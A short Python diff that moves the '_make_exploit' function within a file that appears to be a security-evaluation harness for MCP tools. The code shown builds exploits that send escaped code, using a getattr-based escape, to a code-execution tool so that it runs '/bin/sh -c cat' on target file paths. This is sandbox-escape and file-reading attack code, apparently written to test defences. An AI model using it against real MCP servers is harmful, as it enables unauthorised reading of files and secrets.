@@ -68,6 +68,13 @@ KEPT_PLACES: tuple[str, ...] = (
 )
 
 
+def _make_exploit(place_id: str):
+    async def exploit(places: Places, client: MCPClientPort) -> None:
+        await client.call_tool(TOOL, {"code": _escape(_argv_for(places[place_id]))})
+
+    return exploit
+
+
 def _escape(argv: list[str]) -> str:
     return (
         "ga = getattr\n"
@@ -105,13 +112,6 @@ def _argv_for(place: Place) -> list[str]:
         cat = "cat " + " ".join(shlex.quote(path) for path in paths) + " 2>/dev/null"
         return ["/bin/sh", "-c", cat]
     raise ValueError(f"{place.id}: no exploit for kind {kind}")
-
-
-def _make_exploit(place_id: str):
-    async def exploit(places: Places, client: MCPClientPort) -> None:
-        await client.call_tool(TOOL, {"code": _escape(_argv_for(places[place_id]))})
-
-    return exploit
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
